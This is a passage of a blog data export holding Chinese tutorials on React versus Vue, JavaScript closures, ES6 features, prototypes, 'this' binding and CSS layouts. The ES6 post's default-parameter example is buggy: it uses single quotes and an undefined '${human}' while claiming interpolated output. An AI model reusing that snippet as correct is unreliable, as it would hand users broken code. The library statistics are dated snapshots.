&lt;p&gt;&#123;this.state.message&#125;&lt;/p&gt; &lt;button onClick=&#123;() =&gt; this.reverseMessage()&#125;&gt; Reverse Message &lt;/button&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render(App, document.getElementById('app')); 对于学习标准的web初级开发者而言，模板更容易理解。但是也有很多经验丰富的开发人员乐意使用模板，因为模板可以更好地分离布局和功能，同时也可以选择向Pug这样的预处理器。 但是，使用模板需要学习所有的HTML扩展语法，渲染函数只需要了解标准的HTML和JavaScript 如果你喜欢简单的能正常工作的，那么请选择Vue一个简单的Vue项目可以不需要解析，直接在浏览器中运行，这允许Vue可以像jQuery一样在项目中引用。 虽然在技术上使用React也是可行的，但是典型的React代码更倾向于像classes和non-mulating 数组方法这样的JSX和ES6的特性。但是Vue在简洁设计方面更为深入。我们来比较两者如何处理应用程序的数据（即“状态”）。 在React中State是不可以直接改变的，需要调用setState接口： 123this.setState(&#123; message: this.state.message.split('').reverse().join('') &#125;); 当前和之前的状态差异让React知道什么时候在DOM中重新渲染以及渲染什么，因此不可变的状态是非常必要的。 相比之下，数据可以在Vue中突变。相同的数据属性在Vue中发生变化更为简单。 123// Note that data properties are available as properties of // the Vue instancethis.message = this.message.split('').reverse().join(''); 在你得出Vue渲染系统比React渲染低效的结论之前，让我们来看看Vue中的状态管理：当你向状态添加新对象时，Vue会遍历它的所有属性并且转换为getter和setter。Vue系统会持续追踪状态并且在状态发生变化时，自动重新渲染DOM。 令人印象深刻的是，Vue中的状态改变更为简洁的同时，重新渲染系统的效率其实比React更好。 Vue的反应系统确实有值得注意的事项。例如：它不能检测到属性的添加、删除以及特定数组的变化。在这种情况下，可以使用Vue API中类似React的set方法。 如果你希望你的程序更小更快，那么请选择VueReact和Vue都将构建一个虚拟DOM，并且在应用程序状态更改时同步更新实际的DOM。两者都有自己的优化方法。Vue核心开发人员提供了一个基准测试，展示了Vue的渲染系统比React的更快。在这个测试中，10000个项目的列表被渲染了100次。下面的表格展示了比较的结果。 从实际角度而言，这种基准只与边缘情况有关。大多数应用程序不需要经常进行这种操作，因此不能将其视为比较的一个重要因素。 虽然页面的大小与项目相关，Vue又占据了优势。目前发布的Vue库只有25.6KB。 要用React实现类似的功能，你需要使用React DOM（37.4KB）和React with Addons库（11.4KB），总共为48.8KB，几乎是Vue的两倍。为了公平起见，你可以使用React获得更多的API，但是不会有双倍的功能。 如果你想要构建大型应用程序，那么请选择React用Vue和React来实现简单的应用程序，就像本文开头所说的一样，大部分开发者会偏向于Vue。这是因为基于模板的应用程序乍看更容易理解，并且能够更快启动。 但是这些初始的好处会导致大型程序进展缓慢。模板很容易出现运行时错误，难以测试，也不容易重构或分解。 相比之下，JavaScript制作的模板可以被组织成可分解的组件，DRY code也更容易重用和测试。 Vue也具有组件系统和渲染功能。但是React的渲染系统配置性更高，并且具有浅渲染的特性，与React的测试程序结合时，可以提供更多可测试和可维护的代码。 同时，React不可变的代码并不简单，当透明度和可测试性至关重要时，它会发挥更大的作用。 如果你想要一个同时适用于web和原生APP的库，那么请选择ReactReact Native是用JavaScript创建原生APP的库。它与React相同，只是将web组件换成了原生组件。如果你学习了React.js，那么你很快就可以学会React Native，反之亦然。 123456789101112import React, &#123; Component &#125; from 'react'; import &#123; AppRegistry, Text, View &#125; from 'react-native'; class HelloWorld extends Component &#123; render() &#123; return ( &lt;View&gt; &lt;Text&gt;Hello, React Native!&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125;AppRegistry.registerComponent('HelloWorld', () =&gt; HelloWorld); 重要的是，开发人员可以构建一个web或者原生APP，他们不需要不同的知识体系和工具。如果您打算开发web和移动APP，React会给你带来巨大冲击。 阿里巴巴的Weex是另一个跨平台UI项目。目前，它认为Vue提供了灵感，并且使用了很多相同的语法，并计划完全集成Vue。但是，这个计划的时间表和细节尚未清晰。 由于Vue将HTML模板作为其设计的核心部分，也没有将客户端渲染作为当前的特性，因此很难看到原生的Vue像React.js或React Native一样紧密。 如果你想要最大的生态系统，那么请选择React毫无疑问，React目前是最受欢迎的库，NPM下载量每月约2.5M，Vue每月的下载量为225k。 人气带来的好处不止一点半点。这意味有更多的文章、教程和Stack Overflow回答能够帮助。也意味着在项目中有更多的工具和附加组件可用，同时节省了开发人员自己构建所有模块的时间。 两者都是开源的，但是React诞生自Facebook，受益于它。开发者和热爱React的公司都可以保障React一直被维护。 相比之下，Evan You一个人创建了Vue，同时他也是Vue唯一的全职维护人员。Vue得到了一些企业的赞助，但是还达不到Facebook或是Google的规模。 为了使得Vue团队更为可信，它的小体积和独立性目前并不被当做劣势。Vue有规律的发布周期，令人印象深刻的是，Vue在Github上只有54个公开的问题，3456个关闭的问题，而React有530个开放问题，3447个关闭的问题。 如果你已经选择了其中的一个，那么也不需要换了总而言之，我们发现，Vue的优势是： 模板或渲染的灵活选项 语法以及项目设置的简单 渲染速度更快，体积更小 React的优势是： 更大的规模、更多的使用者、更好的可测试性 Web和原生APP 能提供更多支持和工具的更大的生态系统 然而，React和Vue都是优秀的UI库，并且具有更多的相似之处。它们都有的优势是： 使用虚拟DOM快速渲染 轻量级 响应式组件 服务端渲染 轻松集成的的路由、捆绑和状态管理 强大的支持和社区 如果你认为我们漏掉了一些东西，欢迎在评论中说明。Happy developing！","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"ES6","slug":"ES6","permalink":"http://yoursite.com/tags/ES6/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Vue","slug":"Vue","permalink":"http://yoursite.com/tags/Vue/"},{"name":"Dom","slug":"Dom","permalink":"http://yoursite.com/tags/Dom/"},{"name":"Angular","slug":"Angular","permalink":"http://yoursite.com/tags/Angular/"}]},{"title":"闭包简介","slug":"闭包简介","date":"2016-03-11T05:57:40.000Z","updated":"2018-03-09T06:04:39.892Z","comments":true,"path":"2016/03/11/闭包简介/","link":"","permalink":"http://yoursite.com/2016/03/11/闭包简介/","excerpt":"","text":"闭包简介闭包是JavaScript的重要特性，那么什么是闭包？ 《JavaScript高级程序设计(第3版)》中闭包的定义： 闭包就是指有权访问另一个函数中的变量的函数。 《JavaScript权威指南(第6版)》中闭包的定义： 函数对象可以通过作用域链相互关联起来，函数体内部的变量都可以保存在函数作用域内，这种特性在计算机科学文献中成为“闭包”。 简单来说，在JavaScript中，函数是对象，对象是属性的集合，属性的值也可以是对象，在函数内定义函数就成为一种常见的情况，在函数内部声明函数innerFunction，在innerFunction内部有权访问外部函数的变量对象，这个函数就是我们所说的闭包。 我们来看一个简单的例子：123456function checkScope()&#123; var scope = \"local scope\"; function f() &#123; return scope; &#125; return f();&#125;checkScope();//输出为“local scope” 当函数第一次被调用时，会创建一个执行环境以及相应的作用域链，作用域链的前端，始终都是当前执行代码所在环境的变量对象，作用域链中的下一个变量对象来自包含外部环境，下一个变量则来自下一个外部环境，这样一直延续到全局执行环境。 在上边的例子中，访问scope时，内部的f()函数可以访问f()外部的变量scope，因为它在作用域链中一级一级往上找的时候可以找到scope变量。 闭包的作用一、 模拟私有变量。在函数内创建一个闭包，闭包就可以通过自己的作用域链访问函数内部的变量，可以创建用于访问私有变量的方法。访问私有变量和私有函数的方法被称为特权方法。 1234567891011function MyObject()&#123; var privateVariable = 10; function privateFunction() &#123; return false; &#125; //特权方法 this.publicFunction = function() &#123; privateVariable++; return privateFunction(); &#125;;&#125; 二、 模仿块级作用域。JavaScript中没有块级作用域的概念，这意味着在块语句中定义的变量，实际上是包含在函数中的。如果临时需要一些变量，使用私有作用域。12345678910111213141516function block() &#123; var a = 1; var b = 2; (function () &#123; var a = 3;//覆盖了父作用域中的变量a var c = 4; //访问到了当前作用域中的变量 console.log(a);//3 //访问了父作用域中的变量 console.log(b);//2 //访问当前作用域中的变量 console.log(c);//4 &#125;)() //访问块级作用域中的变量 console.log(c);//c is not defined&#125; 这种技术经常在全局作用域中被用在函数外部，从而限制向全局作用域中添加过多的变量和函数。 循环中的闭包使用闭包时一种常见的错误情况是循环中的闭包，很多初学者都遇到了这个问题。很常见的一种情况就是给页面中的多个按钮绑定点击事件，JavaScript代码如下所示：12345678window.onload = function()&#123; var inputs = document.getElementsByTagName('input'); for(var i = 0; i &lt; inputs.length; i++)&#123; inputs[i].onclick = function()&#123; console.log(i);//希望输出0,1,2,3,4... &#125; &#125;&#125; 页面中有5个按钮，根据上边的代码，我们需要的是依次点击按钮时，控制台分别打印出0，1，2，3，4，而实际上，控制台打印出来的，如下图所示： 这是为什么呢，当for循环执行完之后，i已经变成了按钮的个数5了，而所有点击函数绑定的都是同一个i，点击按钮时，打印出来的i也都变成了5了。 这一部分理解也可以参考http://www.cnblogs.com/qieguo/p/5457040.html。 那么我们为了得到想要的结果，需要在每次循环中创建变量i的拷贝，下面提供三种方法。 第一、使用匿名包装器 1234567891011window.onload = function () &#123; var inputs = document.getElementsByTagName('input'); for (var i = 0; i &lt; inputs.length; i++) &#123; (function (e) &#123; inputs[i].onclick = function () &#123; console.log(e); &#125; &#125;)(i); &#125;&#125; 依次点击按钮，控制台输出如下： 第二、从匿名包装器中返回一个函数：12345678910window.onload = function () &#123; var inputs = document.getElementsByTagName('input'); for (var i = 0; i &lt; inputs.length; i++) &#123; inputs[i].onclick = function (num) &#123; return function () &#123; console.log(num); &#125;; &#125; (i); &#125;&#125; 首先，定义了匿名函数，并将立即执行该匿名函数的结果赋值给数组，匿名函数有一个参数num，在调用每个函数时，我们传入了变量i，函数按值传递，就将变量i的当前值复制给参数num。而在这个匿名函数内部，又创建并返回了一个访问num的闭包，这样一来，每个按钮点击函数都有自己num变量的一个副本，因此可以输出各自不同的数值了。 第三、在循环中使用let 12345678window.onload = function () &#123; var inputs = document.getElementsByTagName('input'); for (let i = 0; i &lt; inputs.length; i++) &#123; inputs[i].onclick = function () &#123; console.log(i); &#125;; &#125;&#125; let是ES6新增的命令，用法类似于var，但是所声明的变量只能在let命令所在代码块内有效。上述代码中，变量i是let声明的，当前的i只在本轮循环有效。所以每一次循环的i其实都是一个新的变量。关于let的用法可参考《ECMAScript 6 入门》中第二章。 内存泄漏产生内存泄漏的原因是IE9之前的版本对JScript对象和COM对象使用不同的垃圾收集例程，因此闭包在IE的这些版本中会导致一些问题。(JavaScript垃圾收集机制可参考《JavaScript高级程序设计(第3版)》4.3)例如：123456function assignHandle() &#123; var element = document.getElementById('elementId'); element.onclick = function () &#123; // element的onclick引用了函数funciton，function通过闭包引用了element，造成循环引用 console.log(element.id); &#125;;&#125; 这个例子中，循环引用导致了element引用数至少为1，element所占内存就永远不会被回收，从而导致了内存泄漏问题。要解决这个问题，就需要解除对DOM对象的引用，减少引用数，确保正常回收其所占用的内存。 引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再次访问这个值了，因而就可以将其占用的内存空间回收回来。 在采用引用计数策略的实现中，出现循环引用时，由于变量的引用次数永远不会是0，函数被多次调用时，就会导致大量内存得不到回收。这一部分理解可以参考MDN中JavaScript内存管理。 结语JavaScript闭包是极其有用的特性，但是由于闭包会携带包含它的函数的作用域，占用更多内存，过多使用闭包可能会导致内存占用过多。","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"}]},{"title":"ES6","slug":"ES6","date":"2016-03-09T06:21:52.000Z","updated":"2018-03-09T06:22:54.770Z","comments":true,"path":"2016/03/09/ES6/","link":"","permalink":"http://yoursite.com/2016/03/09/ES6/","excerpt":"","text":"近年来，随着JavaScript社区的不断发展，JavaScript语言有了很多新的特性。其中的一个好的方面就是通过Node.js渗透了服务端开发，这可以让JavaScript开发者更为强大。 今天，我希望讨论的是ECMA2015（ES6）规范中的三个特性，希望可以让你开始使用ES6。 本文不是ES6特性的详细介绍指南，它是对这些特性的书面介绍。因此，本文不会深入介绍这些特性，也不会列出每个特性的优点与缺点。 箭头函数作为一个JavaScript开发人员，你一定知道原来的函数声明方式。 下面是一个简单的例子，它将时间戳转换成可读的形式。 12345function dateFromTimeStamp(timeStamp) &#123; var humanReadableDate = new Date(timeStamp); return humanReadableDate;&#125;dateFromTimeStamp(1489957823485); ////Sun Mar 19 2017 22:10:23 GMT+0100 (WAT) ES2015中 12var dateFromTimeStamp = timeStamp =&gt; new Date(timeStamp);dateFromTimeStamp(1489957823485); ////Sun Mar 19 2017 22:10:23 GMT+0100 (WAT) 你可以点击这里学习更多关于箭头函数的内容。 模板字符串对我而言，这是一个最重要的特征，它使得我的字符串更易理解和接受。 123456var friendOne = 'Smith';var friendTwo = 'Olawale';var friendThree = 'Victor';var allOfThem = 'The three friends are ' + friendOne + ', ' + friendTwo + ', and' + friendThree; //Output: 'The three friends are Smith, Olawale, andVictor' ES2015中 123456var friendOne = 'Smith';var friendTwo = 'Olawale';var friendThree = 'Victor';var allOfThem = `The three friends are $&#123;friendOne&#125;, $&#123;friendTwo&#125; and $&#123;friendThree&#125;`;//Output: 'The three friends are Smith, Olawale and Victor' 从上边这个例子可以看出，使用ES6模板字符串让编码更轻松，代码更简洁。我相信我不是唯一一个认为旧的解决方案像是hack。另一个好处是，模板支持多行文字，你可以写多行字符串，如果你换行，JavaScript会自动加上\\n。例如： 1234567var author = 'Olawale';var poem = `I am $&#123;author&#125;, this is my poemThere isn't much to sayAnd here is my last line`;//Output: '\\nI am Olawale, this is my poem\\nThere isn\\'t much to say\\nAnd here is my last line\\n' 你可以点击这里学习更多关于模板字符串的内容。 默认参数在ES2015之前，如果你想要在函数中指定默认参数，你必须像在下边这个例子中这样： 123456function greetHuman(name) &#123;name = name || 'human';return 'Hello ' + name + ', we come in peace'; &#125;greetHuman(); // 'Hello human, we come in peace'greetHuman('Olawale'); // 'Hello Olawale, we come in peace' 通过ES6，你可以再函数头处实现，不需要在函数体内检查参数。 让我们来看下面这个例子，这个例子用到了箭头函数、模板字符串和默认参数： 123const greetHuman = (name = 'human') =&gt; 'Hello $&#123;human&#125;, we come in peace';greetHuman('Olawale'); 'Hello Olawale, we come in peace'greetHuman(); 'Hello human, we come in peace' 你可以点击这里学习更多的ES6特性。以下是其他的学习ECMA(ES6)的资源： How to Get Started with learning ES6 Introduction to ES6 The Ultimate JavaScript Cheat Sheet 原文链接：Javascript ES6: 3 Cool Features You Should Be Using","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"ES6","slug":"ES6","permalink":"http://yoursite.com/tags/ES6/"}]},{"title":"JavaScript原型","slug":"JavaScript原型","date":"2016-03-09T06:18:34.000Z","updated":"2018-03-09T06:21:20.006Z","comments":true,"path":"2016/03/09/JavaScript原型/","link":"","permalink":"http://yoursite.com/2016/03/09/JavaScript原型/","excerpt":"","text":"JavaScript原型每一个JavaScript对象(null除外)都和另一个对象相关联，“另一个”对象就是我们熟知的原型，每一个对象都从原型继承属性。 所有通过对象直接创建的对象都具有同一个原型对象，并可以通过JavaScript代码Object.prototype获得原型对象引用。通过关键字new和构造函数调用创建的对象的原型就是构造函数的prototype属性的值。 没有原型的对象为数不多，Object.prototype就是其中之一，不继承任何属性。其他原型对象都是普通对象，普通对象都有原型。所有内置构造函数（以及大部分自定义的构造函数）都具有一个继承自Object.prototype的原型。例如：使用{}创建对象、通过new Object()创建的对象都继承自Object.prototype。同样，通过new Array()创建的对象的原型就是Array.prototype，通过new Date()创建的对象原型就是Date.prototype。 原型链由new Date()创建的Date对象的属性同时继承自Date.prototype和Object.prototype。这一系列链接的原型对象就是所谓的“原型链”。 JavaScript对象具有“自有属性”，也有一些属性是从原型对象继承而来的。我们来看一个简单的例子。 1234567var o=&#123;x:1&#125;;//Object.create()方法使用指定的原型对象和属性创建了一个新的对象var p=Object.create(o);p.y=2;var q=Object.create(p);q.z=3;q.x+q.y //=3 为对象q的属性z赋值时，如果q中存在z属性（这个属性不是继承来的），这个赋值操作只会改变这个已有属性z的值，如果q中不存在属性z，将给q添加一个新的属性z，如果q已经继承了属性z，那就这个继承的属性会被新创建的同名属性覆盖了。 在查询对象q上的属性时，首先判断q中是否存在属性，例如，在查询属性z时，首先判断对象q是否存在属性z，存在则返回属性z的值3，查询属性x时，在对象q中找不到属性x，就在它的原型链上寻找，在o中找到了属性x，并返回x的值，查询y属性时，在原型链中的p对象上找到了属性y，返回y的值，可以计算出q.x+q.y=3。 12o.r=4;q.r;//=&gt;4 上边这个例子，我们可以看出原型的继承是动态的，创建了q对象之后，我们为o对象添加了新的属性，我们可以在q中访问到这个新的属性r。 利用原型创建自定义类型1234567891011121314function Book(name,writer,price)&#123; this.name=name; this.writer=writer; this.price=price;&#125;Book.prototype=&#123; constructor:Book, sayBook:function()&#123; console.log(\"BookName：\"+this.name+\"，BookWriter：\"+this.writer+\"，BookPrice：\"+this.price+\"元\"); &#125;&#125;var book1=new Book(\"book1\",\"Tom\",\"59.9\");book1.sayBook();//BookName：book1，BookWriter：Tom，BookPrice：59.9元 在这个例子中，实例属性是在构造函数中定义的，而所有实例所共享的constructor和sayBook()方法是在原型中定义的。 以下是这个例子的原型图： 注：constructor属性，每个JavaScript函数都拥有一个prototype属性，这个属性的值是一个对象，这个对象包含唯一一个不可枚举的属性constructor,对象继承的constructor指代它们的构造函数。","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"原型链","slug":"原型链","permalink":"http://yoursite.com/tags/原型链/"}]},{"title":"JavaScript中的this","slug":"JavaScript中的this","date":"2016-03-09T06:17:06.000Z","updated":"2018-03-09T06:18:17.491Z","comments":true,"path":"2016/03/09/JavaScript中的this/","link":"","permalink":"http://yoursite.com/2016/03/09/JavaScript中的this/","excerpt":"","text":"JavaScript中的thisthis是函数内部的一个特殊对象，它引用的是函数据以执行的环境对象。 全局环境下的this当在网页的全局作用域中调用函数时，this对象引用的就是window。 123456console.log(this);//Windowfunction f() &#123; return this;&#125;f();//Window 函数f()定义在全局作用域中，引用了this对象，调用函数之前，this的值并不确定，可能会在代码执行过程中引用不同的对象。在全局环境中调用函数f()时，this引用的就是全局对象Window。 对象中的this将一个函数赋给对象，通过对象调用这个函数，它们的this是调用该函数的对象。12345678var o = &#123; color: \"blue\", sayColor: function () &#123; return this.color; &#125;&#125;;o.sayColor();//blue 将函数sayColor赋给对象o，o.sayColor()被调用时，函数内部的this被绑定到o我们也可以用如下方法： 12345678var o = &#123; color: \"blue\" &#125;;function sayColor() &#123; return this.color;&#125;o.sayColor = sayColor;o.sayColor();//blue 函数的名字仅仅是一个包含指针的变量，在何处定义调用函数不会影响到this的行为，全局的sayColor()与o.sayColor()指向的是同一个函数。 构造函数中的this函数或方法之前带有关键字new，它就构成了构造函数调用。通过构造函数生成一个新的对象，this指向新对象、 12345function person() &#123; this.name = \"Jack\";&#125;var o = new person();console.log(o.name);//Jack apply和call每个函数都包含两个非继承而来的方法，apply()和call()。这两个方法的用途都是在特定的作用域中调用函数，实际上等于设置函数体内this对象的值。首先apply()方法接收两个参数：一个是在其中运行函数的作用域，另一个是参数数组。其中，第二个参数可以是Array实例，也可以是 arguments对象。 1234567891011function sum(num1, num2) &#123; return num1 + num2;&#125;function callSum1(num1, num2) &#123; return sum.apply(this, arguments);&#125;function callSum2(num1, num2) &#123; return sum.apply(this, [num1, num2]);&#125;console.log(callSum1(10, 10));//20console.log(callSum2(10, 10));//20 上边这个例子中，callSum1()在执行sum()函数时传入了this作为this值（在作用域中调用的，传入的就是window对象）和arguments对象。而callSum2()也调用了sum()函数，但传入的是this和一个参数数组。 注：在严格模式下，未指定环境对象而调用函数，则this值不会被转型为window，除非明确把函数添加到某个对象或者调用apply()或call()，否则this值是undefined。 call()与apply()方法作用相同，区别仅仅在于接收参数方式不同，对call()而言，第一个参数是this没有变化，不同的是其余参数都直接传递给函数。换句话说，在使用call()方法时，传递给函数的参数必须逐个列举出来。 1234567function sum(num1, num2) &#123; return num1 + num2;&#125;function callSum(num1, num2) &#123; return sum.call(this, num1, num2);&#125;console.log(callSum(10, 10));//20 call()和apply()真正强大的地方在于能扩充函数赖以运行的作用域。 123456789window.color = \"red\";var o = &#123; color: \"blue\" &#125;;function sayColor() &#123; console.log(this.color);&#125;sayColor();//redsayColor.call(this);//redsayColor.call(window);//redsayColor.call(o);//blue 使用call()或者apply()扩充作用域最大的好处，就是对象不需要与方法有任何耦合关系。 bindES5还定义了bind,这个方法会创建一个函数的实例，其this值会被绑定传给bind()函数的值 1234567window.color = \"red\";var o = &#123; color: \"blue\" &#125;;function sayColor() &#123; console.log(this.color);&#125;var objectSayColor = sayColor.bind(o);objectSayColor();//blue 在sayColor()调用bind()并传入对象o，创建了objectSayColor()函数,该函数的this值等于o因此即使在全局作用域中调用这个函数，也会看到“blue”。 闭包中的this闭包中使用this对象可能会导致一些问题，this对象在运行时是基于函数的执行环境对象的：在全局函数中，this等于window，而当函数被作为某个对象方法调用时，this等于那个对象。匿名函数的执行环境具有全局性，因此其this对象通常指向window。 123456789101112131415161718192021var color = \"red\";var o = &#123; name: \"blue\", sayColor: function () &#123; return function () &#123; return this.color; &#125;; &#125;&#125;console.log(o.sayColor()());//red//改进var o = &#123; color: \"blue\", sayColor: function () &#123; var that = this; return function () &#123; return that.color; &#125;; &#125;&#125;console.log(o.sayColor()());//blue ES6中箭头函数中的thisthis引用的是函数据以执行的环境对象。但是在使用箭头函数时，函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。箭头函数的使用可参考链接http://es6.ruanyifeng.com/#docs/function 1234567function foo() &#123; setTimeout(() =&gt; &#123; console.log('id:', this.id); &#125;, 100)&#125;var id = 21;foo.call(&#123; id: 42 &#125;);//id：42 箭头函数中的this指向foo的this，箭头函数中也不存在arguments，指向外层函数foo对象的arguments。 由于箭头函数没有自己的this，所以也不能用call()、apply()、bind()改变this的指向。 绑定this函数绑定运算符是::，双冒号是左边是一个对象，右边是一个函数。该运算符会自动将左边的对象作为上下文环境（this对象），绑定到右边函数上。详细可参考链接http://es6.ruanyifeng.com/#docs/function 123foo::bar;//等同于bar.bind(foo); 在判断this指向时，要记住，在没有绑定this的情况下，this动态绑定，指向运行时的环境，而非代码中的位置，只有箭头函数才是静态绑定，将this绑定到代码中的位置。","categories":[],"tags":[]},{"title":"css布局十八般武艺都在这里了","slug":"css布局十八般武艺都在这里了","date":"2015-03-09T05:45:24.000Z","updated":"2018-03-09T05:56:10.058Z","comments":true,"path":"2015/03/09/css布局十八般武艺都在这里了/","link":"","permalink":"http://yoursite.com/2015/03/09/css布局十八般武艺都在这里了/","excerpt":"","text":"CSS布局布局是CSS中一个重要部分，本文总结了CSS布局中的常用技巧，包括常用的水平居中、垂直居中方法，以及单列布局、多列布局的多种实现方式（包括传统的盒模型布局和比较新的flex布局实现），希望能给需要的小伙伴带来一些帮助。 目录 常用居中方法 水平居中 垂直居中 单列布局 二列&amp;三列布局 float+margin position+margin 圣杯布局（float+负margin） 双飞翼布局（float+负margin） flex布局 总结 1.常用居中方法居中在布局中很常见，我们假设DOM文档结构如下，子元素要在父元素中居中： 123&lt;div class=\"parent\"&gt; &lt;div class=\"child\"&gt;&lt;/div&gt;&lt;/div&gt; 水平居中子元素为行内元素还是块状元素，宽度一定还是宽度未定，采取的布局方案不同。下面进行分析： 行内元素：对父元素设置text-align:center;定宽块状元素: 设置左右margin值为auto;不定宽块状元素: 设置子元素为display:inline,然后在父元素上设置text-align:center;通用方案: flex布局，对父元素设置display:flex;justify-content:center; 垂直居中垂直居中对于子元素是单行内联文本、多行内联文本以及块状元素采用的方案是不同的。 父元素一定，子元素为单行内联文本：设置父元素的height等于行高line-height父元素一定，子元素为多行内联文本：设置父元素的display:table-cell或inline-block，再设置vertical-align:middle;块状元素:设置子元素position:fixed（absolute），然后设置margin:auto;通用方案: flex布局，给父元素设置{display:flex; align-items:center;}。 2.单列布局特征：定宽、水平居中 常见的单列布局有两种： 一种是header、content、footer宽度都相同，其一般不会占满浏览器的最宽宽度，但当浏览器宽度缩小低于其最大宽度时，宽度会自适应。 一种是header、footer宽度为浏览器宽度，但content以及header和footer里的内容却不会占满浏览器宽度。 对于第一种，对header、content、footer统一设置width或max-width，并通过margin:auto实现居中。 DOM文档:12345&lt;div class=\"layout\"&gt; &lt;div id=\"header\"&gt;头部&lt;/div&gt; &lt;div id=\"content\"&gt;内容&lt;/div&gt; &lt;div id=\"footer\"&gt;尾部&lt;/div&gt;&lt;/div&gt; CSS清单:12345.layout&#123;/* width: 960px; *//*设置width当浏览器窗口宽度小于960px时，单列布局不会自适应。*/ max-width: 960px; margin: 0 auto;&#125; 对于第二种，header、footer的内容宽度为100%，但header、footer的内容区以及content统一设置max-width，并通过margin:auto实现居中。 DOM文档:1234567&lt;div id=\"header\"&gt; &lt;div class=\"layout\"&gt;头部&lt;/div&gt;&lt;/div&gt;&lt;div id=\"content\" class=\"layout\"&gt;内容&lt;/div&gt;&lt;div id=\"footer\"&gt; &lt;div class=\"layout\"&gt;尾部&lt;/div&gt;&lt;/div&gt; CSS清单:12345.layout&#123;/* width: 960px; *//*设置width当浏览器窗口宽度小于960px时，单列布局不会自适应。*/ max-width: 960px; margin: 0 auto;&#125; 3. 二列&amp;三列布局 二列布局的特征是侧栏固定宽度，主栏自适应宽度。三列布局的特征是两侧两列固定宽度，中间列自适应宽度。 之所以将二列布局和三列布局写在一起，是因为二列布局可以看做去掉一个侧栏的三列布局，其布局的思想有异曲同工之妙。对于传统的实现方法，主要讨论上图中前三种布局，经典的带有侧栏的二栏布局以及带有左右侧栏的三栏布局，对于flex布局，实现了上图的五种布局。 a. float+margin原理说明：设置两个侧栏分别向左向右浮动，中间列通过外边距给两个侧栏腾出空间，中间列的宽度根据浏览器窗口自适应。 DOM文档: 12345&lt;div id=\"content\"&gt; &lt;div class=\"sub\"&gt;sub&lt;/div&gt; &lt;div class=\"extra\"&gt;extra&lt;/div&gt; &lt;div class=\"main\"&gt;main&lt;/div&gt;&lt;/div&gt; 布局步骤: 对两边侧栏分别设置宽度，并对左侧栏添加左浮动，对右侧栏添加有浮动。 对主面板设置左右外边距，margin-left的值为左侧栏的宽度，margin-right的值为右侧栏的宽度。 CSS清单: 123456789101112.sub&#123; width: 100px; float: left;&#125;.extra&#123; width: 200px; float: right;&#125;.main&#123; margin-left: 100px; margin-right: 200px;&#125; 一些说明: 注意DOM文档的书写顺序，先写两侧栏，再写主面板，更换后则侧栏会被挤到下一列（圣杯布局和双飞翼布局都会用到）。 这种布局方式比较简单明了，但缺点是渲染时先渲染了侧边栏，而不是比较重要的主面板。 二列的实现方法 如果是左边带有侧栏的二栏布局，则去掉右侧栏，不要设置主面板的margin-right值，其他操作相同。反之亦然。 b. position+margin原理说明：通过绝对定位将两个侧栏固定，同样通过外边距给两个侧栏腾出空间，中间列自适应。 DOM文档: 123&lt;div class=\"sub\"&gt;left&lt;/div&gt;&lt;div class=\"main\"&gt;main&lt;/div&gt;&lt;div class=\"extra\"&gt;right&lt;/div&gt; 布局步骤: 对两边侧栏分别设置宽度，设置定位方式为绝对定位。 设置两侧栏的top值都为0，设置左侧栏的left值为0， 右侧栏的right值为0。 对主面板设置左右外边距，margin-left的值为左侧栏的宽度，margin-right的值为右侧栏的宽度。 CSS清单: 1234567891011121314.sub, .extra &#123; position: absolute; top: 0; width: 200px;&#125;.sub &#123; left: 0;&#125;.extra &#123; right: 0; &#125;.main &#123; margin: 0 200px;&#125; 一些说明: 与上一种方法相比，本种方法是通过定位来实现侧栏的位置固定。 如果中间栏含有最小宽度限制，或是含有宽度的内部元素，则浏览器窗口小到一定程度，主面板与侧栏会发生重叠。 二列的实现方法 如果是左边带有侧栏的二栏布局，则去掉右侧栏，不要设置主面板的margin-right值，其他操作相同。反之亦然。 c. 圣杯布局(float + 负margin + padding + position)原理说明： 主面板设置宽度为100%，主面板与两个侧栏都设置浮动，常见为左浮动，这时两个侧栏会被主面板挤下去。通过负边距将浮动的侧栏拉上来，左侧栏的负边距为100%，刚好是窗口的宽度，因此会从主面板下面的左边跑到与主面板对齐的左边，右侧栏此时浮动在主面板下面的左边，设置负边距为负的自身宽度刚好浮动到主面板对齐的右边。为了避免侧栏遮挡主面板内容，在外层设置左右padding值为左右侧栏的宽度，给侧栏腾出空间，此时主面板的宽度减小。由于侧栏的负margin都是相对主面板的，两个侧栏并不会像我们理想中的停靠在左右两边，而是跟着缩小的主面板一起向中间靠拢。此时使用相对布局，调整两个侧栏到相应的位置。 DOM文档: 12345 &lt;div id=\"bd\"&gt; &lt;div class=\"main\"&gt;&lt;/div&gt; &lt;div class=\"sub\"&gt;&lt;/div&gt; &lt;div class=\"extra\"&gt;&lt;/div&gt; &lt;/div&gt; 布局步骤: 三者都设置向左浮动。 设置main宽度为100%，设置两侧栏的宽度。 设置 负边距，sub设置负左边距为100%，extra设置负左边距为负的自身宽度。 设置main的padding值给左右两个子面板留出空间。 设置两个子面板为相对定位，sub的left值为负的sub宽度，extra的right值为负的extra宽度。 